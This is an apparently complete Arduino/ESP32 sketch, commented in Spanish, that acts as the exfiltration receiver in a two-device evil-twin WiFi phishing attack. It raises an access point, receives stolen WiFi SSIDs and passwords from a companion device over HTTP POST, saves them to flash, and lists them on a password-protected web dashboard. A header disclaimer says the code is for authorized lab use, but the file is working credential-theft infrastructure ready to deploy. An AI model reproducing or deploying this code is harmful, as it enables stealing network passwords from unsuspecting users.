// ============================================================
//  ESP32 #2 - Exfiltrador WiFi
//  Proyecto educativo - Solo uso en laboratorio autorizado
//  Entorno controlado - No usar en redes ajenas sin permiso
//
//  - Levanta el AP "EvilTwin-Link" (debe coincidir con ESP32 #1)
//  - Recibe credenciales del ESP32 #1 via HTTP POST en /recv
//  - Las muestra en panel web en 192.168.10.1/panel
//  - Panel protegido con usuario/contrasenna (cambialos abajo)
// ============================================================


// ------------------------------------------------------------
// Librerias
// ------------------------------------------------------------
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <Preferences.h>


// ------------------------------------------------------------
// Configuracion
// >>> CAMBIA ESTAS CREDENCIALES ANTES DE USAR <<<
// >>> EXFIL_SSID y EXFIL_PASS deben coincidir con ESP32 #1 <<<
// ------------------------------------------------------------
#define EXFIL_SSID    "EvilTwin-Link"
#define EXFIL_PASS    "exfil_pass_123"
#define PANEL_USER    "admin"
#define PANEL_PASS    "change_me"
#define LED_PIN       2
#define MAX_CREDS     50


// ------------------------------------------------------------
// Red
// ------------------------------------------------------------
IPAddress apIP(192, 168, 10, 1);
WebServer webServer(80);
Preferences prefs;


// ------------------------------------------------------------
// Estructura de credencial
// ------------------------------------------------------------
struct Credential {
  String ssid;
  String password;
  String timestamp;
};


// ------------------------------------------------------------
// Variables globales
// ------------------------------------------------------------
Credential    creds[MAX_CREDS];
int           credCount  = 0;
bool          ledState   = false;
unsigned long lastBlink  = 0;


// ------------------------------------------------------------
// Prototipos
// ------------------------------------------------------------
void handlePanel();
void handleReceive();
void handleClear();
void handleNotFound();
void blinkLED();
void loadCreds();
void saveCred(int idx);
void clearAllCreds();
String buildPanel();


// ============================================================
// SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  Serial.println("[Exfil] Iniciando ESP32 #2...");

  loadCreds();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(EXFIL_SSID, EXFIL_PASS);

  Serial.printf("[Exfil] AP: %s | IP: %s\n", EXFIL_SSID, apIP.toString().c_str());
  Serial.printf("[Exfil] Panel: http://192.168.10.1/panel  (%s / %s)\n", PANEL_USER, PANEL_PASS);

  webServer.on("/panel", HTTP_GET,  handlePanel);
  webServer.on("/recv",  HTTP_POST, handleReceive);
  webServer.on("/clear", HTTP_POST, handleClear);
  webServer.onNotFound(handleNotFound);
  webServer.begin();

  Serial.println("[Exfil] Listo. Esperando credenciales...");
}


// ============================================================
// LOOP
// ============================================================
void loop() {
  webServer.handleClient();
  blinkLED();
}


// ============================================================
// ALMACENAMIENTO PERSISTENTE (NVS Flash)
// ============================================================
void loadCreds() {
  prefs.begin("exfil", true);
  credCount = prefs.getInt("cnt", 0);
  if (credCount > MAX_CREDS) credCount = MAX_CREDS;
  for (int i = 0; i < credCount; i++) {
    creds[i].ssid      = prefs.getString(("s" + String(i)).c_str(), "");
    creds[i].password  = prefs.getString(("p" + String(i)).c_str(), "");
    creds[i].timestamp = prefs.getString(("t" + String(i)).c_str(), "guardado");
  }
  prefs.end();
  Serial.printf("[NVS] %d credenciales cargadas de flash.\n", credCount);
}

void saveCred(int idx) {
  prefs.begin("exfil", false);
  prefs.putInt("cnt", credCount);
  prefs.putString(("s" + String(idx)).c_str(), creds[idx].ssid);
  prefs.putString(("p" + String(idx)).c_str(), creds[idx].password);
  prefs.putString(("t" + String(idx)).c_str(), creds[idx].timestamp);
  prefs.end();
}

void clearAllCreds() {
  prefs.begin("exfil", false);
  prefs.clear();
  prefs.end();
  credCount = 0;
  Serial.println("[NVS] Credenciales borradas.");
}

void handleClear() {
  if (!webServer.authenticate(PANEL_USER, PANEL_PASS)) {
    return webServer.requestAuthentication();
  }
  clearAllCreds();
  webServer.sendHeader("Location", "/panel");
  webServer.send(303);
}


// ============================================================
// LED
// ============================================================
void blinkLED() {
  if (credCount > 0) { digitalWrite(LED_PIN, HIGH); return; }
  if (millis() - lastBlink >= 1000) {
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState);
    lastBlink = millis();
  }
}


// ============================================================
// RECEPCION - /recv
// ============================================================
void handleReceive() {
  if (!webServer.hasArg("password") || !webServer.hasArg("ssid")) {
    webServer.send(400, "text/plain", "Bad Request");
    return;
  }
  if (credCount >= MAX_CREDS) {
    webServer.send(507, "text/plain", "Full");
    return;
  }

  int idx = credCount;
  creds[idx].ssid      = webServer.arg("ssid");
  creds[idx].password  = webServer.arg("password");
  creds[idx].timestamp = String(millis() / 1000) + "s";
  credCount++;
  saveCred(idx);

  Serial.printf("[Exfil] *** CREDENCIAL #%d ***  SSID: %s  PWD: %s (guardado en flash)\n",
    credCount,
    creds[idx].ssid.c_str(),
    creds[idx].password.c_str());

  webServer.send(200, "text/plain", "OK");
}


// ============================================================
// PANEL WEB - /panel
// ============================================================
void handlePanel() {
  if (!webServer.authenticate(PANEL_USER, PANEL_PASS)) {
    return webServer.requestAuthentication();
  }
  webServer.send(200, "text/html", buildPanel());
}

void handleNotFound() {
  webServer.sendHeader("Location", "/panel");
  webServer.send(302);
}


// ============================================================
// HTML DEL PANEL
// ============================================================
String buildPanel() {
  String html =
    "<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<meta http-equiv='refresh' content='3'>"
    "<title>Panel Exfiltrador</title>"
    "<style>"
    "body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;margin:0;padding:0;}"
    "h1{background:#16213e;padding:1em;margin:0;color:#00d4ff;font-size:1.3em;}"
    "h1 small{font-size:0.7em;color:#aaa;display:block;margin-top:4px;}"
    ".panel{max-width:960px;margin:auto;padding:1em;}"
    ".card{background:#16213e;border-radius:8px;padding:1em;margin-bottom:1em;}"
    ".card h2{margin:0 0 0.5em;color:#00d4ff;font-size:1em;text-transform:uppercase;}"
    "table{width:100%;border-collapse:collapse;font-size:0.9em;}"
    "th{background:#0f3460;color:#00d4ff;padding:8px;text-align:left;}"
    "td{padding:7px 8px;border-bottom:1px solid #333;}"
    ".pwd{font-family:monospace;font-size:1.2em;color:#2ecc71;font-weight:bold;}"
    ".num{font-size:2.5em;font-weight:bold;color:#2ecc71;}"
    ".empty{color:#555;text-align:center;padding:2em;font-size:1.1em;}"
    "</style></head><body>"
    "<h1>Panel Exfiltrador"
    "<small>Entorno controlado - Solo uso educativo | Refresco cada 3s</small></h1>"
    "<div class='panel'>";

  html += "<div class='card'><h2>Credenciales Recibidas</h2>";
  html += "<p>Total: <span class='num'>" + String(credCount) + "</span></p></div>";

  html += "<div class='card'><h2>Listado</h2>";
  if (credCount == 0) {
    html += "<p class='empty'>Esperando credenciales del ESP32 #1...</p>";
  } else {
    html += "<table><tr><th>#</th><th>SSID</th><th>Contrasenna</th><th>Tiempo</th></tr>";
    for (int i = credCount - 1; i >= 0; i--) {
      html += "<tr>"
              "<td>" + String(i+1) + "</td>"
              "<td>" + creds[i].ssid + "</td>"
              "<td><span class='pwd'>" + creds[i].password + "</span></td>"
              "<td>" + creds[i].timestamp + "</td>"
              "</tr>";
    }
    html += "</table>";
    html += "<form method='post' action='/clear' style='margin-top:0.5em'>"
            "<button style='padding:8px 16px;border:none;border-radius:5px;cursor:pointer;"
            "font-weight:bold;background:#c0392b;color:#fff;' "
            "onclick=\"return confirm('Borrar todas las credenciales?')\">"
            "Borrar credenciales</button></form>";
  }
  html += "</div>";
  html += "</div></body></html>";
  return html;
}
